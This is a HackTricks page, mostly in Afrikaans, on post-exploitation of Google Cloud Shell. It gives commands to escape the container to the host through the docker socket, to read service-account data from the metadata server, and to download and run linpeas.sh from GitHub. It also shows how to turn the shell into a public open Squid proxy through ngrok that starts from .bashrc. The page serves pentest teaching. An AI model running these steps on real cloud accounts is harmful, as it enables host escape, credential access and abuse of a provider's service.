# GCP - Cloud Shell Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell

Vir meer inligting oor Cloud Shell, sien:

{{#ref}}
../gcp-services/gcp-cloud-shell-enum.md
{{#endref}}

### Container Escape

Let wel dat die Google Cloud Shell binne 'n container loop; jy kan **easily escape to the host** deur die volgende te doen:

<details>

<summary>Container escape commands</summary>
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
</details>

Dit word nie deur google as 'n kwesbaarheid beskou nie, maar dit gee jou 'n breër insig in wat in daardie omgewing gebeur.

Boonop, let daarop dat jy vanaf die host 'n service account token kan vind:

<details>

<summary>Haal service account uit metadata</summary>
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
</details>

Met die volgende scopes:

<details>

<summary>Haal service account scopes op</summary>
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
</details>

Enumereer metadata met LinPEAS:

<details>

<summary>Enumereer metadata met LinPEAS</summary>
```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sh linpeas.sh -o cloud
```
</details>

Na die gebruik van [https://github.com/carlospolop/bf_my_gcp_permissions](https://github.com/carlospolop/bf_my_gcp_permissions) met die token van die Service Account is **geen permissies gevind**...

### Gebruik dit as Proxy

As jy jou google cloud shell instance as Proxy wil gebruik, moet jy die volgende opdragte uitvoer (of dit in die .bashrc file insit):

<details>

<summary>Installeer Squid proxy</summary>
```bash
sudo apt install -y squid
```
</details>

Net om jou te laat weet, Squid is 'n http proxy server. Skep 'n **squid.conf**-lêer met die volgende instellings:

<details>

<summary>Skep 'n squid.conf-lêer</summary>
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
</details>

Kopieer die **squid.conf** lêer na **/etc/squid**

<details>

<summary>Kopieer die konfigurasie na /etc/squid</summary>
```bash
sudo cp squid.conf /etc/squid
```
</details>

Laastens voer die squid-diens uit:

<details>

<summary>Begin squid-diens</summary>
```bash
sudo service squid start
```
</details>

Gebruik ngrok om die proxy van buite beskikbaar te maak:

<details>

<summary>Maak die proxy met ngrok beskikbaar</summary>
```bash
./ngrok tcp 3128
```
</details>

Na uitvoering, kopieer die tcp:// url. As jy die proxy vanaf 'n browser' wil gebruik, word dit aanbeveel om die tcp://-deel en die port te verwyder en die port in die portveld van jou browser se proxy-instellings te sit (squid is 'n http proxy server).

Vir beter gebruik by opstart moet die .bashrc file die volgende reëls hê:

<details>

<summary>Voeg by .bashrc vir outomatiese opstart</summary>
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
</details>

Die instruksies is gekopieer vanaf [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key). Kyk daardie bladsy vir ander gekke idees om enige soort sagteware (databasisse en selfs windows) in Cloud Shell te laat loop.

{{#include ../../../banners/hacktricks-training.md}}
